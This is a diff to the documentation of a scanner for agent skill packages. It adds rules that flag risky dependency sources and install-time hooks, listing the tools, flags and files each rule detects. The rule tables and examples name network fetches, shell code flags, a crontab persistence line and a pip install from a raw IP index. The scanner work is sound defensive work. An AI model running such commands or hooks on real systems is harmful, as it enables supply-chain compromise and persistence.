@@ -57,6 +57,8 @@ A file is text when its extension is `.md`, `.txt`, `.sh`, `.bash`, `.zsh`, `.py
 | Bundled agent configuration: `plugin.json`, `.mcp.json`, `settings.json`, `hooks.json`, `opencode.json`, `opencode.jsonc` | `critical` |
 | Invisible characters | See [Invisible characters](#invisible-characters) |
 | Archive that the scan could not read in full | `warn` |
+| Bundled `package.json`, `setup.py`, or `pyproject.toml` with a script that runs on install | See [Install hooks](#install-hooks) |
+| Bundled `package.json` dependency from a URL or a Git host | See [Dependency sources](#dependency-sources) |
 
 #### Archive members
 
@@ -136,6 +138,7 @@ Claude Code runs `` !`command` `` and code fences whose info string starts with 
 | Any other sentence that fetches a URL and obeys what it says | `warn` |
 | Environment reads, in a file that also calls the network (`fetch(`, `requests.`, `axios`, `http.request(`, `curl`, `wget`) or runs code (`eval(`, `exec(`, `child_process`, `subprocess.`, `os.system(`) | `warn` |
 | Environment reads in any other file | `info` |
+| A pip or npm install from a package index or registry that the skill picks, from a URL or Git, or with TLS checks off | See [Dependency sources](#dependency-sources) |
 
 An environment read is a variable whose name holds `key`, `token`, `secret`, `pass`, `auth`, or `cred`, a read of the whole environment such as `JSON.stringify(process.env)`, or `.env` in quotes or after a `/`. `.env.example`, `.env.sample`, `.env.template`, and `.env.dist` are not `.env` files.
 
@@ -263,6 +266,40 @@ The `persistence` rule looks for commands that install something to run again la
 A write is `>`, `>>`, `tee`, or the destination of `cp`, `mv`, `install`, `ln`, or `rsync`. An append is `>>` or `tee -a`. A shell start file is `.bashrc`, `.zshrc`, `.profile`, `.bash_profile`, `.zprofile`, `.zshenv`, or `config.fish`. For example, `printf "@reboot python3 /tmp/helper.py\n" | crontab -` is `critical`, `echo 'export PATH=$PATH:~/bin' >> ~/.zshrc` is `warn`, and `source ~/.zshrc` is not a finding.
 
 A command counts at the start of a statement or after a pipe, so "Edit the crontab file by hand" is not a finding. A match in a `#` or `//` comment drops one level. Prohibitions and demotion work as they do for [text patterns](#text-patterns).
+
+### Dependency sources
+
+The `dependency-source` rule looks for installs from a source the skill picks. It reads commands the way [persistence](#persistence) does: wrappers such as `sudo` are skipped, and a command counts at the start of a statement or after a pipe. Flags may come before the subcommand, as in `npm --registry URL install`. It also reads the dependencies of a bundled `package.json`.
+
+| finding | severity |
+| --- | --- |
+| An index or registry on a host other than the default, or on any `http://` URL: `--index-url`, `-i`, or `--extra-index-url` after `pip install`, `--registry` after `npm`, `pnpm`, `yarn`, or `bun` `install`, `i`, `add`, or `ci`, `npm config set registry`, and `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, `UV_INDEX_URL`, or `NPM_CONFIG_REGISTRY` in any case set with `=` | `critical` |
+| An index or registry value that is not an `https://` or `http://` URL, such as `$INDEX` or a `file://` path | `warn` |
+| `--trusted-host`, `--find-links`, or `-f` after `pip install` | `warn` |
+| A pip install of `git+…` or a URL, including `-r` with a URL, an npm install of a URL, `git+…`, `git://`, `github:`, `gitlab:`, or `bitbucket:`, and a bundled `package.json` dependency with the same value | `warn` |
+| `curl -k` or `--insecure`, also inside a flag group such as `-fsSLk`, and `wget --no-check-certificate` | `warn` |
+| A Git or URL install pinned to a 40-character commit hash: the ref after `@` or `#`, or the name after `/archive/` | `info` |
+
+The default pip hosts are `pypi.org` and `files.pythonhosted.org`. The default npm hosts are `registry.npmjs.org` and `registry.yarnpkg.com`. A pip command is `pip`, `pip3`, `pipx`, `python -m pip`, or `uv pip`. Registry config also covers `npm set`, `pnpm config set`, `yarn config set`, a scoped key such as `@org:registry`, Yarn's `npmRegistryServer`, and `pip config set global.index-url`. The `package.json` fields are `dependencies`, `devDependencies`, `optionalDependencies`, and `peerDependencies`.
+
+For example, `pip install --index-url http://45.1.2.3/simple foo` is `critical`, `curl -k https://x.invalid/tool.tgz -o tool.tgz` is `warn`, and `pip install "requests>=2.31"` is not a finding. A match in a `#` or `//` comment drops one level. Prohibitions and demotion work as they do for [text patterns](#text-patterns).
+
+### Install hooks
+
+The `install-hook` rule reads bundled package manifests for code that runs when the agent installs the package:
+
+- `package.json`: the `preinstall`, `install`, and `postinstall` scripts.
+- `setup.py`: an `install` entry, as a dict key, a `dict(install=…)` argument, or `cmdclass['install'] = …`, in a file that names `cmdclass`.
+- `pyproject.toml`: Hatch build hooks under `tool.hatch.build` or a build target, `tool.poetry.build`, `tool.setuptools.cmdclass.install`, and `build-system.backend-path`.
+
+| finding | severity |
+| --- | --- |
+| A hook that holds `curl` or `wget` with a URL, `node -e`, `--eval`, `-p`, or `--print`, `sh -c`, `bash -c`, `zsh -c`, or `dash -c`, `python -c`, or a pipe to a shell. Other flags may come first, and the code flag may sit in a group such as `-pe` or `-lc`. | `critical` |
+| A `setup.py` install command whose class holds one of these, or calls `urlopen(`, `urlretrieve(`, or `requests.get(`. When the file does not define the class, the whole file counts. | `critical` |
+| Any other hook, and a `package.json` or `pyproject.toml` that does not parse | `warn` |
+| A `package.json` hook that is exactly `husky install`, `patch-package`, `prisma generate`, `npx only-allow pnpm`, or `nuxt prepare` | `info` |
+
+The allowlist comes from [GuardDog](https://github.com/DataDog/guarddog). For example, `"postinstall": "node scripts/setup.js"` is `warn`, and `"postinstall": "husky install"` is `info`. The rule reads files with these exact names, including archive members, and never Markdown that quotes them.
 
 ### Money movement
 
